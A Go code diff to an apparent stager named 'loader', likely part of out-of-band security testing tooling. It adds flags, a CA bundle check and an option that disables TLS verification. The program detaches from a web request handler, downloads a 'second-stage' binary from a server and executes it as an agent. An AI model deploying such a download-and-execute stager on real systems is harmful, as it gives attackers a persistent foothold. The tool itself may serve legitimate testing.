@@ -16,6 +16,7 @@
 package main
 
 import (
+	"crypto/tls"
 	"io"
 	"net/http"
 	"os"
@@ -27,18 +28,55 @@ func die(msg string) {
 	os.Exit(1)
 }
 
-func main() {
-	if len(os.Args) != 4 {
-		die("usage: loader <url> <token> <agent_id>")
+// hasCABundle checks that at least one system CA bundle file is readable.
+// On Windows, Go uses the built-in certificate store so the check always passes.
+func hasCABundle() bool {
+	if runtime.GOOS == "windows" {
+		return true
 	}
-	serverURL := os.Args[1]
-	token := os.Args[2]
-	agentID := os.Args[3]
+	for _, p := range []string{
+		"/etc/ssl/certs/ca-certificates.crt",
+		"/etc/pki/tls/certs/ca-bundle.crt",
+		"/etc/ssl/ca-bundle.pem",
+		"/etc/ssl/cert.pem",
+	} {
+		if _, err := os.Stat(p); err == nil {
+			return true
+		}
+	}
+	return false
+}
+
+func main() {
+	// Parse optional flags before positional args.
+	insecure, foreground, args := false, false, os.Args[1:]
+	for len(args) > 0 && len(args[0]) > 0 && args[0][0] == '-' {
+		switch args[0] {
+		case "-k":
+			insecure = true
+		case "-f":
+			foreground = true
+		default:
+			die("unknown flag: " + args[0] + " (expected -k or -f)")
+		}
+		args = args[1:]
+	}
+	if len(args) != 3 {
+		die("usage: loader [-k] [-f] <url> <token> <agent_id>")
+	}
+	serverURL := args[0]
+	token := args[1]
+	agentID := args[2]
+
+	// Pre-flight checks — run before daemonizing so errors reach stderr.
+	if !insecure && !hasCABundle() {
+		die("no CA bundle found (install ca-certificates or use -k to skip TLS verification)")
+	}
 
 	// Daemonize: re-exec self detached so a short-lived parent (e.g. a web
-	// request handler) returns immediately.  The sentinel env var prevents
-	// infinite re-exec.
-	if os.Getenv("_OAST_D") == "" {
+	// request handler) returns immediately.  Skipped with -f or when
+	// already the daemon child.
+	if os.Getenv("_OAST_D") == "" && !foreground {
 		daemonize() // does not return on success
 	}
 
@@ -49,13 +87,20 @@ func main() {
 
 	dlURL := serverURL + "/dl/second-stage/" + runtime.GOOS + "-" + runtime.GOARCH
 
+	client := &http.Client{}
+	if insecure {
+		client.Transport = &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
+		}
+	}
+
 	req, err := http.NewRequest(http.MethodGet, dlURL, nil)
 	if err != nil {
 		die("request error: " + err.Error())
 	}
 	req.Header.Set("Authorization", "Bearer "+token)
 
-	resp, err := http.DefaultClient.Do(req)
+	resp, err := client.Do(req)
 	if err != nil {
 		die("download error: " + err.Error())
 	}
@@ -83,5 +128,5 @@ func main() {
 		die("chmod error: " + err.Error())
 	}
 
-	execAgent(tmpPath, serverURL, token, agentID)
+	execAgent(tmpPath, serverURL, token, agentID, insecure)
 }
